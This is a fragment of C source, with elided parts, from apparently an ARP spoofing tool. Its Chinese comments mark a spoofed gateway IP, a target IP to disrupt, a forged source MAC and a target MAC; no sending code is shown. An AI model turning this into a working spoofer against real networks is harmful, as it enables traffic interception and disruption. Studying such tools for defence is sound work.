...
int main() {
    ...
    int packet_size;
    char *device = "eth1";    /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
    u_int8_t *src_ip_str = "192.168.0.60";        /* 冒充的网关IP */
    u_int8_t *dst_ip_str = "192.168.0.132";        /* 干扰的目标IP */
    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0x83, 0xc1, 0x31};/* 虚假的源MAC */
    u_int8_t dst_mac[6] = {0x00, 0x21, 0x9b, 0x2a, 0x63, 0xb4};/* 干扰的目标MAC */
